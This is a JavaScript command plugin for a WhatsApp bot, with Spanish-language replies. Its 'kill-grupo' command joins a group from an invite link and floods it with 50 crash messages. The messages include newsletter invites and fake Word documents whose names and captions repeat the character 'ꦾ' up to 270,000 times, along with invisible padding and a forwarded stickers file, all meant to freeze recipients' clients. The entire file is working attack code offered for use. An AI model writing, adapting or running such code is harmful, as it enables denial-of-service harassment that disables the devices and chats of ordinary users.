import fs from 'fs';

let handler = async (m, { conn, text }) => {
  const ownerNumber = '527447800928@s.whatsapp.net'; // Owner real
  const botNumber = conn.user?.jid || '';
  const sender = m.sender;

  if (sender !== ownerNumber && sender !== botNumber) {
    return conn.reply(m.chat, '👑 Este comando solo está disponible para el owner y el bot.', m);
  }

  if (!text || !text.includes('whatsapp.com')) {
    return m.reply('😿 Usa: .kill-grupo <enlace del grupo>', m);
  }

  const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
  if (!match) return m.reply('😡 Enlace inválido.', m);

  const inviteCode = match[1];
  let groupId;

  try {
    groupId = await conn.groupAcceptInvite(inviteCode);
  } catch {
    groupId = `120363${inviteCode}@g.us`;
  }

  // Mensaje canal (newsletterAdminInviteMessage)
  const canalSend = async () => {
    const travas = 'ꦾ'.repeat(90000);
    await conn.relayMessage(groupId, {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363282786345717@newsletter",
        newsletterName: "🗣🗣🗣🗣" + travas + travas + travas,
        jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
        caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
        inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
      }
    }, {});
  };

  // Mensaje documento (fake doc con traba)
  const docSend = async (i) => {
    const baseTraba = 'ꦾ'.repeat(30000);
    const descripcionFinal = baseTraba + baseTraba + baseTraba;

    const contenidoInvisible = '\u200E'.repeat(5000) + i;
    const fakeDoc = Buffer.from(contenidoInvisible);
    const fileName = `🔥𝗧𝗢𝗕𝗜🔥_${i + 1}`.repeat(2);

    await conn.sendMessage(groupId, {
      document: fakeDoc,
      fileName,
      mimetype: 'application/msword',
      caption: descripcionFinal
    });
  };

  // Mensaje archivo (reenviar stickers.json)
  const archivoSend = async () => {
    const FILE_PATH = './stickers.json';
    if (!fs.existsSync(FILE_PATH)) return;

    const mensaje = JSON.parse(fs.readFileSync(FILE_PATH, 'utf-8'));
    if (!mensaje?.message) return;

    await conn.copyNForward(groupId, mensaje, true);
  };

  // Enviar 50 mensajes: 16 ciclos completos de 3 + 2 mensajes
  const totalMessages = 50;
  const delayMs = 6000; // 6 segundos

  for (let i = 0; i < Math.floor(totalMessages / 3); i++) {
    await canalSend();
    await new Promise(res => setTimeout(res, delayMs));

    await docSend(i);
    await new Promise(res => setTimeout(res, delayMs));

    await archivoSend();
    await new Promise(res => setTimeout(res, delayMs));
  }

  // Enviar los 2 mensajes restantes: canal y documento
  const remaining = totalMessages % 3;

  if (remaining >= 1) {
    await canalSend();
    await new Promise(res => setTimeout(res, delayMs));
  }

  if (remaining === 2) {
    await docSend(Math.floor(totalMessages / 3));
    await new Promise(res => setTimeout(res, delayMs));
  }

  await conn.reply(m.chat, `😼 50 mensajes enviados al grupo ${groupId}`, m);
};

handler.help = ['kill-grupo <enlace>'];
handler.tags = ['tools', 'grupo'];
handler.command = ['kill-grupo'];

export default handler;